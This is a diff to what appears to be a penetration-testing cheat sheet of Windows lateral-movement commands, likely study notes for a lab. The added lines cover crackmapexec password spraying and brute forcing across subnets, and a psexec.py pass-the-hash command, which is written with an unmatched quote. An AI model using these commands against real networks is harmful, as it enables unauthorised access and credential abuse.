@@ -21,9 +21,10 @@ hashcat64.exe -m 1000 hashfile.txt rockyou.txt -O
 You can only pass NTLM V1 hashes
 
 ```
-pth-winexe -U Administrator%LMHASH:NTLMHASH //IP cmd
-
 crackmapexec smb IP -u "USERNAME" -H HASH --local-auth
+
+e.g.
+crackmapexec smb 192.168.64.0/24 -u fcastle -d KOMBINAT.local -p 'Password1' --local-auth
 ```
 
 ## CrackMapExec
@@ -31,7 +32,7 @@ crackmapexec smb IP -u "USERNAME" -H HASH --local-auth
 Brute Force
 
 ```
-crackmapexec smb 10.10.10.184 -u USER_LIST -p pass.txt
+crackmapexec smb 10.10.10.184 -u USER_LIST -p pass.txt (--continue-on-success)
 ```
 
 List shares
@@ -50,4 +51,12 @@ Test credentials on local network (password spraying)
 
 ```
 crackmapexec 192.168.57.0/24 -u USERNAME -d DOMAIN.local -p PASSWORD
+```
+
+## PSEXEC
+
+PSEXEC supports hashes instead of passwords - Note: Entire hash needed LMN:NTLM
+
+```
+psexec.py "username:@192.168.57.141 -hashes lmn:ntlm
 ```
